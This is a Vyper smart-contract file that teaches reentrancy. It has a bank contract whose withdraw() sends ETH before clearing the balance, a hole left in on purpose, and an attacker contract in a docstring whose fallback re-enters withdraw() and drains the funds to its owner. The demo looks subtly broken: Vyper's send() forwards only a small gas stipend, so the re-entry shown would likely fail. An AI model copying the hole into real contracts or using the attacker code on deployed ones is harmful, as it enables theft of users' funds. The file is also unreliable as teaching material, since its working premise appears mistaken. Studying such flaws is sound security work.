# @version ^0.3.0

"""
@title Reentrancy Vulnerability Example
@notice VULNERABLE - DO NOT USE IN PRODUCTION
@dev This contract is vulnerable to reentrancy attacks.
     Vyper does NOT automatically prevent reentrancy.
"""

# Storage
balances: public(HashMap[address, uint256])

@external
@payable
def deposit():
    """
    @notice Deposit ETH into the contract
    """
    self.balances[msg.sender] += msg.value


@external
def withdraw():
    """
    @notice Withdraw all deposited ETH
    @dev VULNERABLE: External call before state update
         This violates the Checks-Effects-Interactions pattern
    """
    amount: uint256 = self.balances[msg.sender]
    assert amount > 0, "Insufficient balance"

    # VULNERABILITY: External call before state update
    # An attacker can re-enter this function during the send
    send(msg.sender, amount)

    # State update happens too late
    self.balances[msg.sender] = 0


@external
@view
def get_balance() -> uint256:
    """
    @notice Get contract balance
    """
    return self.balance


# Example Attacker Contract (in comments, would be separate file)
"""
# @version ^0.3.0

interface VulnerableBank:
    def deposit(): payable
    def withdraw(): nonpayable
    def get_balance() -> uint256: view

vulnerable_bank: public(VulnerableBank)
attack_count: public(uint256)
owner: public(address)

@external
def __init__(bank_address: address):
    self.vulnerable_bank = VulnerableBank(bank_address)
    self.owner = msg.sender
    self.attack_count = 0

@external
@payable
def attack():
    assert msg.value >= as_wei_value(1, "ether"), "Need at least 1 ether"
    self.vulnerable_bank.deposit(value=msg.value)
    self.vulnerable_bank.withdraw()

@external
@payable
def __default__():
    # Fallback function that re-enters withdraw
    if self.vulnerable_bank.get_balance() >= as_wei_value(1, "ether") and self.attack_count < 5:
        self.attack_count += 1
        self.vulnerable_bank.withdraw()

@external
def withdraw_loot():
    assert msg.sender == self.owner
    send(self.owner, self.balance)
"""
